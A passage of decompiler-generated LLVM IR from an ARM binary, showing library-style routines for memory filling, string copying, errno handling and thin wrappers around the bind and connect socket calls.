  %v6_11ff4 = load i32, i32* @r5, align 4
  %v9_11ff4 = load i32, i32* @lr, align 4
  %v1_11ff8 = add i32 %tmp, 24
  store i32 %v1_11ff8, i32* @r4, align 4
  %v2_11ffc = ptrtoint i32* %stack_var_-28 to i32
  store i32 78100, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v2_11ffc, i32* @r0, align 4
  store i32 %v1_11ff8, i32* %r2.global-to-local, align 4
  %v8_12018 = call i32 @function_13114(i32 %v2_11ffc, i32 ptrtoint (i32* @global_var_1310c.372 to i32), i32 %v1_11ff8, i32 78100, i32 %v3_11ff4, i32 %v6_11ff4, i32 %v9_11ff4)
  %v0_1201c = load i32, i32* @r4, align 4
  store i32 %v0_1201c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1310c.372 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1202c.381 to i32), i32* @lr, align 4
  %v1_12028 = call i32 @function_1310c()
  store i32 %v1_12028, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1202c

dec_label_pc_1202c:                               ; preds = %dec_label_pc_12060, %dec_label_pc_11ff4
  %v0_1202c = load i32, i32* @r5, align 4
  %v1_1202c = add i32 %v0_1202c, 4
  %v2_1202c = inttoptr i32 %v1_1202c to i32*
  %v3_1202c = load i32, i32* %v2_1202c, align 4
  store i32 %v3_1202c, i32* %r2.global-to-local, align 4
  %v4_1202c = add i32 %v0_1202c, 8
  %v5_1202c = inttoptr i32 %v4_1202c to i32*
  %v6_1202c = load i32, i32* %v5_1202c, align 4
  store i32 %v6_1202c, i32* %r3.global-to-local, align 4
  %tmp8 = icmp ugt i32 %v6_1202c, %v3_1202c
  br i1 %tmp8, label %dec_label_pc_12060, label %dec_label_pc_12038

dec_label_pc_12038:                               ; preds = %dec_label_pc_1202c
  %v1_12038 = inttoptr i32 %v0_1202c to i32*
  %v2_12038 = load i32, i32* %v1_12038, align 4
  store i32 %v2_12038, i32* @r0, align 4
  %v1_1203c = add i32 %v0_1202c, 12
  %v2_1203c = inttoptr i32 %v1_1203c to i32*
  %v3_1203c = load i32, i32* %v2_1203c, align 4
  %v1_12040 = add i32 %v0_1202c, 20
  %v2_12040 = inttoptr i32 %v1_12040 to i32*
  %v3_12040 = load i32, i32* %v2_12040, align 4
  store i32 %v3_12040, i32* @r2, align 4
  %v4_12044 = call i32 @function_13588(i32 %v2_12038, i32 %v3_1203c, i32 %v3_12040, i32 %v6_1202c)
  store i32 %v4_12044, i32* %r0.global-to-local, align 4
  %tmp7 = icmp slt i32 %v4_12044, 1
  br i1 %tmp7, label %.thread, label %dec_label_pc_12054

.thread:                                          ; preds = %dec_label_pc_12038
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_12094

dec_label_pc_12054:                               ; preds = %dec_label_pc_12038
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_12058 = load i32, i32* @r5, align 4
  %v2_12058 = add i32 %v1_12058, 4
  %v3_12058 = inttoptr i32 %v2_12058 to i32*
  store i32 0, i32* %v3_12058, align 4
  %v1_1205c = load i32, i32* @r5, align 4
  %v2_1205c = add i32 %v1_1205c, 8
  %v3_1205c = inttoptr i32 %v2_1205c to i32*
  store i32 %v4_12044, i32* %v3_1205c, align 4
  %v0_12060.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12060

dec_label_pc_12060:                               ; preds = %dec_label_pc_1202c, %dec_label_pc_12054
  %v1_12078 = phi i32 [ %v0_1202c, %dec_label_pc_1202c ], [ %v0_12060.pre, %dec_label_pc_12054 ]
  %v1_12060 = add i32 %v1_12078, 4
  %v2_12060 = inttoptr i32 %v1_12060 to i32*
  %v3_12060 = load i32, i32* %v2_12060, align 4
  store i32 %v3_12060, i32* %r2.global-to-local, align 4
  %v1_12064 = add i32 %v1_12078, 12
  %v2_12064 = inttoptr i32 %v1_12064 to i32*
  %v3_12064 = load i32, i32* %v2_12064, align 4
  store i32 %v3_12064, i32* %ip.global-to-local, align 4
  %v2_12068 = add i32 %v3_12064, %v3_12060
  store i32 %v2_12068, i32* @r4, align 4
  %v1_1206c = add i32 %v2_12068, 4
  %v2_1206c = inttoptr i32 %v1_1206c to i32*
  %v3_1206c = load i32, i32* %v2_1206c, align 4
  %v1_12070 = add i32 %v2_12068, 8
  %v2_12070 = inttoptr i32 %v1_12070 to i8*
  %v3_12070 = load i8, i8* %v2_12070, align 1
  %v4_12070 = zext i8 %v3_12070 to i32
  store i32 %v4_12070, i32* %r3.global-to-local, align 4
  %v1_12074 = add i32 %v2_12068, 9
  %v2_12074 = inttoptr i32 %v1_12074 to i8*
  %v3_12074 = load i8, i8* %v2_12074, align 1
  %v4_12074 = zext i8 %v3_12074 to i32
  store i32 %v4_12074, i32* %r0.global-to-local, align 4
  %v2_12078 = add i32 %v1_12078, 16
  %v3_12078 = inttoptr i32 %v2_12078 to i32*
  store i32 %v3_1206c, i32* %v3_12078, align 4
  %v0_1207c = load i32, i32* %r2.global-to-local, align 4
  %v1_1207c = load i32, i32* %ip.global-to-local, align 4
  %v2_1207c = add i32 %v1_1207c, %v0_1207c
  %v3_1207c = inttoptr i32 %v2_1207c to i32*
  %v4_1207c = load i32, i32* %v3_1207c, align 4
  %v0_12080 = load i32, i32* %r3.global-to-local, align 4
  %v1_12080 = load i32, i32* %r0.global-to-local, align 4
  %v4_12080 = mul i32 %v1_12080, 256
  %v5_12080 = or i32 %v4_12080, %v0_12080
  store i32 %v5_12080, i32* %r3.global-to-local, align 4
  %v2_12084 = add i32 %v5_12080, %v0_1207c
  store i32 %v2_12084, i32* @r2, align 4
  %v2_12088 = icmp eq i32 %v4_1207c, 0
  %v1_1208c = load i32, i32* @r5, align 4
  %v2_1208c = add i32 %v1_1208c, 4
  %v3_1208c = inttoptr i32 %v2_1208c to i32*
  store i32 %v2_12084, i32* %v3_1208c, align 4
  br i1 %v2_12088, label %dec_label_pc_1202c, label %dec_label_pc_12094

dec_label_pc_12094:                               ; preds = %dec_label_pc_12060, %.thread
  store i32 %v2_11ffc, i32* @r0, align 4
  store i32 78100, i32* %r3.global-to-local, align 4
  store i32 73896, i32* @lr, align 4
  %v3_120a4 = load i32, i32* @r2, align 4
  %v8_120a4 = call i32 @function_13114(i32 %v2_11ffc, i32 1, i32 %v3_120a4, i32 78100, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_120a8 = load i32, i32* @r4, align 4
  store i32 %v0_120a8, i32* %r0.global-to-local, align 4
  store i32 %v3_11ff4, i32* @r4, align 4
  store i32 %v6_11ff4, i32* @r5, align 4
  ret i32 %v0_120a8

; uselistorder directives
  uselistorder i32 %v1_12078, { 0, 2, 1 }
  uselistorder i32 %v6_1202c, { 1, 0, 2 }
  uselistorder i32 %v0_1202c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_11ffc, { 1, 0, 3, 2 }
  uselistorder i32 %v1_11ff8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 1, 5, 6, 0 }
  uselistorder label %dec_label_pc_12060, { 1, 0 }
}

define i32 @function_120c4() local_unnamed_addr {
dec_label_pc_120c4:
  ret i32 ptrtoint (i32* @global_var_1cb10.384 to i32)
}

define i32 @function_120d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_120d0:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %v1_120dc = bitcast i32* %stack_var_-20 to %tms*
  %v2_120dc = call i32 @function_13918(%tms* %v1_120dc)
  %v2_120e4 = load i32, i32* %stack_var_-20, align 4
  %v2_120e8 = add i32 %v2_120e4, %tmp
  %v2_120f0 = mul i32 %v2_120e8, 10000
  %v1_120f4 = and i32 %v2_120f0, 2147483632
  ret i32 %v1_120f4

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @function_12110(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12110:
  %v0_12110 = call i32 @function_13d20()
  ret i32 %v0_12110
}

define i32 @function_12120(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12120:
  %v0_12120 = call i32 @function_13d20()
  ret i32 %v0_12120

; uselistorder directives
  uselistorder i32 ()* @function_13d20, { 1, 0 }
}

define i32 @function_12130(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12130:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_12134 = load i32, i32* @r2, align 4
  %v8_12134 = icmp eq i32 %v0_12134, 8
  store i1 %v8_12134, i1* %cpsr_z.global-to-local, align 1
  %v5_12138 = icmp slt i32 %v0_12134, 8
  br i1 %v5_12138, label %dec_label_pc_12198, label %dec_label_pc_1213c

dec_label_pc_1213c:                               ; preds = %dec_label_pc_12130
  %v4_1213c = mul i32 %arg2, 256
  %v5_1213c = or i32 %v4_1213c, %arg2
  %v4_12140 = mul i32 %v5_1213c, 65536
  %v5_12140 = or i32 %v4_12140, %v5_1213c
  store i32 %v5_12140, i32* %r1.global-to-local, align 4
  %v1_1214457 = urem i32 %tmp, 4
  %v2_1214458 = icmp eq i32 %v1_1214457, 0
  store i1 %v2_1214458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_1214458, label %dec_label_pc_12154, label %bb

bb:                                               ; preds = %dec_label_pc_1213c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_1213c ]
  %v3_1214859 = phi i32 [ %v6_12148, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_1213c ]
  %v4_12148 = inttoptr i32 %v3_1214859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_12148, align 1
  %v5_12148 = load i32, i32* %r3.global-to-local, align 4
  %v6_12148 = add i32 %v5_12148, 1
  store i32 %v6_12148, i32* %r3.global-to-local, align 4
  %v0_1214c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_12158.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_1214c.pr, label %dec_label_pc_12154, label %.thread

.thread:                                          ; preds = %bb
  %v2_1214c = add i32 %v0_12158.pr.pre, -1
  store i32 %v2_1214c, i32* @r2, align 4
  %v1_12144 = urem i32 %v6_12148, 4
  %v2_12144 = icmp eq i32 %v1_12144, 0
  store i1 %v2_12144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12144, label %dec_label_pc_12154, label %.thread.bb_crit_edge

.thread.bb_crit_edge:                             ; preds = %.thread
  %v1_12148.pre = load i32, i32* %r1.global-to-local, align 4
  %extract.t82 = trunc i32 %v1_12148.pre to i8
  br label %bb

dec_label_pc_12154:                               ; preds = %.thread, %bb, %dec_label_pc_1213c
  %v0_1216028 = phi i32 [ %tmp, %dec_label_pc_1213c ], [ %v6_12148, %bb ], [ %v6_12148, %.thread ]
  %v0_12158.pr = phi i32 [ %v0_12134, %dec_label_pc_1213c ], [ %v0_12158.pr.pre, %bb ], [ %v2_1214c, %.thread ]
  %v0_12154 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12154, i32* %ip.global-to-local, align 4
  %v8_1215810 = icmp eq i32 %v0_12158.pr, 8
  store i1 %v8_1215810, i1* %cpsr_z.global-to-local, align 1
  %v5_1215c11 = icmp slt i32 %v0_12158.pr, 8
  br i1 %v5_1215c11, label %dec_label_pc_12198, label %dec_label_pc_12160.preheader

dec_label_pc_12160.preheader:                     ; preds = %dec_label_pc_12154
  %v1_1216046 = inttoptr i32 %v0_1216028 to i32*
  store i32 %v0_12154, i32* %v1_1216046, align 4
  %v3_1216047 = add i32 %v0_1216028, 4
  %v4_1216048 = inttoptr i32 %v3_1216047 to i32*
  %v5_1216049 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_1216049, i32* %v4_1216048, align 4
  %v6_1216050 = add i32 %v0_1216028, 8
  store i32 %v6_1216050, i32* %r3.global-to-local, align 4
  %v0_1216451 = load i32, i32* @r2, align 4
  %v1_1216452 = add i32 %v0_1216451, -8
  store i32 %v1_1216452, i32* %r2.global-to-local, align 4
  %v5_1216c53 = icmp slt i32 %v1_1216452, 8
  br i1 %v5_1216c53, label %dec_label_pc_12160.dec_label_pc_12198.loopexit_crit_edge, label %dec_label_pc_12170

dec_label_pc_12170:                               ; preds = %dec_label_pc_12160.preheader, %dec_label_pc_12158.dec_label_pc_12160_crit_edge
  %v6_1216055 = phi i32 [ %v6_12160, %dec_label_pc_12158.dec_label_pc_12160_crit_edge ], [ %v6_1216050, %dec_label_pc_12160.preheader ]
  %v0_1216054 = phi i32 [ %v12_1218c, %dec_label_pc_12158.dec_label_pc_12160_crit_edge ], [ %v0_1216028, %dec_label_pc_12160.preheader ]
  %v1_12170 = inttoptr i32 %v6_1216055 to i32*
  %v2_12170 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_12170, i32* %v1_12170, align 4
  %v3_12170 = add i32 %v0_1216054, 12
  %v4_12170 = inttoptr i32 %v3_12170 to i32*
  %v5_12170 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12170, i32* %v4_12170, align 4
  %v6_12170 = add i32 %v0_1216054, 16
  store i32 %v6_12170, i32* %r3.global-to-local, align 4
  %v0_12174 = load i32, i32* %r2.global-to-local, align 4
  %v1_12174 = add i32 %v0_12174, -8
  store i32 %v1_12174, i32* %r2.global-to-local, align 4
  %v5_1217c = icmp slt i32 %v1_12174, 8
  br i1 %v5_1217c, label %dec_label_pc_12170.dec_label_pc_12198.loopexit_crit_edge, label %dec_label_pc_12180

dec_label_pc_12180:                               ; preds = %dec_label_pc_12170
  %v1_12180 = inttoptr i32 %v6_12170 to i32*
  %v2_12180 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_12180, i32* %v1_12180, align 4
  %v3_12180 = add i32 %v0_1216054, 20
  %v4_12180 = inttoptr i32 %v3_12180 to i32*
  %v5_12180 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12180, i32* %v4_12180, align 4
  %v6_12180 = add i32 %v0_1216054, 24
  store i32 %v6_12180, i32* %r3.global-to-local, align 4
  %v0_12184 = load i32, i32* %r2.global-to-local, align 4
  %v1_12184 = add i32 %v0_12184, -8
  store i32 %v1_12184, i32* %r2.global-to-local, align 4
  %v5_1218c = icmp slt i32 %v1_12184, 8
  br i1 %v5_1218c, label %dec_label_pc_12180.dec_label_pc_12198.loopexit_crit_edge, label %dec_label_pc_12158

dec_label_pc_12158:                               ; preds = %dec_label_pc_12180
  %v7_1218c = inttoptr i32 %v6_12180 to i32*
  %v8_1218c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_1218c, i32* %v7_1218c, align 4
  %v9_1218c = add i32 %v0_1216054, 28
  %v10_1218c = inttoptr i32 %v9_1218c to i32*
  %v11_1218c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_1218c, i32* %v10_1218c, align 4
  %v12_1218c = add i32 %v0_1216054, 32
  store i32 %v12_1218c, i32* %r3.global-to-local, align 4
  %v6_12190 = load i32, i32* %r2.global-to-local, align 4
  %v7_12190 = add i32 %v6_12190, -8
  store i32 %v7_12190, i32* %r2.global-to-local, align 4
  %v5_1215c = icmp slt i32 %v7_12190, 8
  br i1 %v5_1215c, label %dec_label_pc_12158.dec_label_pc_12198.loopexit_crit_edge, label %dec_label_pc_12158.dec_label_pc_12160_crit_edge

dec_label_pc_12158.dec_label_pc_12160_crit_edge:  ; preds = %dec_label_pc_12158
  %v2_12160.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12160 = inttoptr i32 %v12_1218c to i32*
  store i32 %v2_12160.pre, i32* %v1_12160, align 4
  %v3_12160 = add i32 %v0_1216054, 36
  %v4_12160 = inttoptr i32 %v3_12160 to i32*
  %v5_12160 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_12160, i32* %v4_12160, align 4
  %v6_12160 = add i32 %v0_1216054, 40
  store i32 %v6_12160, i32* %r3.global-to-local, align 4
  %v0_12164 = load i32, i32* %r2.global-to-local, align 4
  %v1_12164 = add i32 %v0_12164, -8
  store i32 %v1_12164, i32* %r2.global-to-local, align 4
  %v5_1216c = icmp slt i32 %v1_12164, 8
  br i1 %v5_1216c, label %dec_label_pc_12160.dec_label_pc_12198.loopexit_crit_edge, label %dec_label_pc_12170

dec_label_pc_12160.dec_label_pc_12198.loopexit_crit_edge: ; preds = %dec_label_pc_12158.dec_label_pc_12160_crit_edge, %dec_label_pc_12160.preheader
  %v1_12164.lcssa = phi i32 [ %v1_1216452, %dec_label_pc_12160.preheader ], [ %v1_12164, %dec_label_pc_12158.dec_label_pc_12160_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12198

dec_label_pc_12158.dec_label_pc_12198.loopexit_crit_edge: ; preds = %dec_label_pc_12158
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12198

dec_label_pc_12170.dec_label_pc_12198.loopexit_crit_edge: ; preds = %dec_label_pc_12170
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12198

dec_label_pc_12180.dec_label_pc_12198.loopexit_crit_edge: ; preds = %dec_label_pc_12180
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12198

dec_label_pc_12198:                               ; preds = %dec_label_pc_12154, %dec_label_pc_12160.dec_label_pc_12198.loopexit_crit_edge, %dec_label_pc_12158.dec_label_pc_12198.loopexit_crit_edge, %dec_label_pc_12170.dec_label_pc_12198.loopexit_crit_edge, %dec_label_pc_12180.dec_label_pc_12198.loopexit_crit_edge, %dec_label_pc_12130
  %v0_121a0 = phi i32 [ %v0_12134, %dec_label_pc_12130 ], [ %v1_12184, %dec_label_pc_12180.dec_label_pc_12198.loopexit_crit_edge ], [ %v1_12174, %dec_label_pc_12170.dec_label_pc_12198.loopexit_crit_edge ], [ %v7_12190, %dec_label_pc_12158.dec_label_pc_12198.loopexit_crit_edge ], [ %v1_12164.lcssa, %dec_label_pc_12160.dec_label_pc_12198.loopexit_crit_edge ], [ %v0_12158.pr, %dec_label_pc_12154 ]
  %v2_12198 = icmp eq i32 %v0_121a0, 0
  store i1 %v2_12198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12198, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_12198
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_12198
  %v1_121a0 = sub i32 7, %v0_121a0
  store i32 %v1_121a0, i32* %r2.global-to-local, align 4
  %v3_121a4 = mul i32 %v1_121a0, 4
  %v4_121a4 = add i32 %v3_121a4, ptrtoint (i32* @global_var_121ac.386 to i32)
  call void @__pseudo_branch(i32 %v4_121a4)
  %v0_121ac = load i32, i32* %r1.global-to-local, align 4
  %v1_121ac = trunc i32 %v0_121ac to i8
  %v2_121ac = load i32, i32* %r3.global-to-local, align 4
  %v3_121ac = inttoptr i32 %v2_121ac to i8*
  store i8 %v1_121ac, i8* %v3_121ac, align 1
  %v4_121ac = load i32, i32* %r3.global-to-local, align 4
  %v5_121ac = add i32 %v4_121ac, 1
  store i32 %v5_121ac, i32* %r3.global-to-local, align 4
  %v0_121b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_121b0 = trunc i32 %v0_121b0 to i8
  %v3_121b0 = inttoptr i32 %v5_121ac to i8*
  store i8 %v1_121b0, i8* %v3_121b0, align 1
  %v4_121b0 = load i32, i32* %r3.global-to-local, align 4
  %v5_121b0 = add i32 %v4_121b0, 1
  store i32 %v5_121b0, i32* %r3.global-to-local, align 4
  %v0_121b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_121b4 = trunc i32 %v0_121b4 to i8
  %v3_121b4 = inttoptr i32 %v5_121b0 to i8*
  store i8 %v1_121b4, i8* %v3_121b4, align 1
  %v4_121b4 = load i32, i32* %r3.global-to-local, align 4
  %v5_121b4 = add i32 %v4_121b4, 1
  store i32 %v5_121b4, i32* %r3.global-to-local, align 4
  %v0_121b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_121b8 = trunc i32 %v0_121b8 to i8
  %v3_121b8 = inttoptr i32 %v5_121b4 to i8*
  store i8 %v1_121b8, i8* %v3_121b8, align 1
  %v4_121b8 = load i32, i32* %r3.global-to-local, align 4
  %v5_121b8 = add i32 %v4_121b8, 1
  store i32 %v5_121b8, i32* %r3.global-to-local, align 4
  %v0_121bc = load i32, i32* %r1.global-to-local, align 4
  %v1_121bc = trunc i32 %v0_121bc to i8
  %v3_121bc = inttoptr i32 %v5_121b8 to i8*
  store i8 %v1_121bc, i8* %v3_121bc, align 1
  %v4_121bc = load i32, i32* %r3.global-to-local, align 4
  %v5_121bc = add i32 %v4_121bc, 1
  store i32 %v5_121bc, i32* %r3.global-to-local, align 4
  %v0_121c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_121c0 = trunc i32 %v0_121c0 to i8
  %v3_121c0 = inttoptr i32 %v5_121bc to i8*
  store i8 %v1_121c0, i8* %v3_121c0, align 1
  %v4_121c0 = load i32, i32* %r3.global-to-local, align 4
  %v5_121c0 = add i32 %v4_121c0, 1
  store i32 %v5_121c0, i32* %r3.global-to-local, align 4
  %v0_121c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_121c4 = trunc i32 %v0_121c4 to i8
  %v3_121c4 = inttoptr i32 %v5_121c0 to i8*
  store i8 %v1_121c4, i8* %v3_121c4, align 1
  %v4_121c4 = load i32, i32* %r3.global-to-local, align 4
  %v5_121c4 = add i32 %v4_121c4, 1
  store i32 %v5_121c4, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_12160, { 1, 0 }
  uselistorder i32 %v12_1218c, { 1, 2, 0 }
  uselistorder i32 %v0_1216054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_12158.pr, { 0, 2, 1 }
  uselistorder i32 %v6_12148, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1213c, { 1, 0 }
  uselistorder i32 %v0_12134, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 0 }
  uselistorder i32* %ip.global-to-local, { 4, 1, 2, 3, 0, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 4, 1, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_12198, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_12170, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_121d0(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_121d0:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_121d0 = sub i32 %arg1, %tmp
  %v1_121d4 = add i32 %v2_121d0, -1
  store i32 %v1_121d4, i32* %r2.global-to-local, align 4
  %v2_121d84 = load i8, i8* %arg2, align 1
  %v5_121d86 = add i32 %tmp, 1
  store i32 %v5_121d86, i32* %r1.global-to-local, align 4
  %v2_121dc7 = icmp eq i8 %v2_121d84, 0
  store i1 %v2_121dc7, i1* %cpsr_z.global-to-local, align 1
  %v5_121e08 = inttoptr i32 %arg1 to i8*
  store i8 %v2_121d84, i8* %v5_121e08, align 1
  %v0_121e49 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_121e49, label %dec_label_pc_121e8, label %dec_label_pc_121d8.dec_label_pc_121d8_crit_edge

dec_label_pc_121d8.dec_label_pc_121d8_crit_edge:  ; preds = %dec_label_pc_121d0, %dec_label_pc_121d8.dec_label_pc_121d8_crit_edge
  %v0_121d8.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_121e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_121d8 = inttoptr i32 %v0_121d8.pre to i8*
  %v2_121d8 = load i8, i8* %v1_121d8, align 1
  %v5_121d8 = add i32 %v0_121d8.pre, 1
  store i32 %v5_121d8, i32* %r1.global-to-local, align 4
  %v2_121dc = icmp eq i8 %v2_121d8, 0
  store i1 %v2_121dc, i1* %cpsr_z.global-to-local, align 1
  %v4_121e0 = add i32 %v5_121d8, %v3_121e0.pre
  %v5_121e0 = inttoptr i32 %v4_121e0 to i8*
  store i8 %v2_121d8, i8* %v5_121e0, align 1
  %v0_121e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_121e4, label %dec_label_pc_121e8, label %dec_label_pc_121d8.dec_label_pc_121d8_crit_edge

dec_label_pc_121e8:                               ; preds = %dec_label_pc_121d8.dec_label_pc_121d8_crit_edge, %dec_label_pc_121d0
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_121d8.dec_label_pc_121d8_crit_edge, { 1, 0 }
}

define i32 @function_121ec(i32 %arg1) local_unnamed_addr {
dec_label_pc_121ec:
  %stack_var_-8 = alloca i32, align 4
  %v2_121f0 = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_121f0, i32* @r1, align 4
  %v0_121f8 = call i32 @function_141b0()
  %v2_121fc = icmp eq i32 %v0_121f8, 0
  br i1 %v2_121fc, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_121ec
  %v3_12204 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_121ec, %bb
  %v5_1220c = phi i32 [ -1, %dec_label_pc_121ec ], [ %v3_12204, %bb ]
  ret i32 %v5_1220c

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_12210(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12210:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12210 = load i32, i32* @r4, align 4
  store i32 %v3_12210, i32* %stack_var_-8, align 4
  %v5_12214 = call i32 @bind(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_12214, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12214, -4095
  br i1 %tmp, label %dec_label_pc_12234, label %dec_label_pc_12224

dec_label_pc_12224:                               ; preds = %dec_label_pc_12210
  %v0_12224 = call i32 @function_120c4()
  %v0_12228 = load i32, i32* %r4.global-to-local, align 4
  %v1_12228 = sub i32 0, %v0_12228
  %v2_1222c = inttoptr i32 %v0_12224 to i32*
  store i32 %v1_12228, i32* %v2_1222c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12234

dec_label_pc_12234:                               ; preds = %dec_label_pc_12210, %dec_label_pc_12224
  %v0_12234 = phi i32 [ %v5_12214, %dec_label_pc_12210 ], [ -1, %dec_label_pc_12224 ]
  %v2_12238 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12238, i32* @r4, align 4
  ret i32 %v0_12234

; uselistorder directives
  uselistorder i32 %v5_12214, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12234, { 1, 0 }
}

define i32 @function_1223c(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1223c:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1223c = load i32, i32* @r4, align 4
  store i32 %v3_1223c, i32* %stack_var_-8, align 4
  %v5_12240 = call i32 @connect(i32 %arg1, %sockaddr* %arg2, i32 %arg3)
  store i32 %v5_12240, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_12240, -4095
  br i1 %tmp, label %dec_label_pc_12260, label %dec_label_pc_12250

dec_label_pc_12250:                               ; preds = %dec_label_pc_1223c
  %v0_12250 = call i32 @function_120c4()
  %v0_12254 = load i32, i32* %r4.global-to-local, align 4
  %v1_12254 = sub i32 0, %v0_12254
  %v2_12258 = inttoptr i32 %v0_12250 to i32*
  store i32 %v1_12254, i32* %v2_12258, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12260

dec_label_pc_12260:                               ; preds = %dec_label_pc_1223c, %dec_label_pc_12250
  %v0_12260 = phi i32 [ %v5_12240, %dec_label_pc_1223c ], [ -1, %dec_label_pc_12250 ]
  %v2_12264 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12264, i32* @r4, align 4
  ret i32 %v0_12260

; uselistorder directives
  uselistorder i32 %v5_12240, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12260, { 1, 0 }
}

define i32 @function_12268(i32 %arg1, %sockaddr* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12268:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
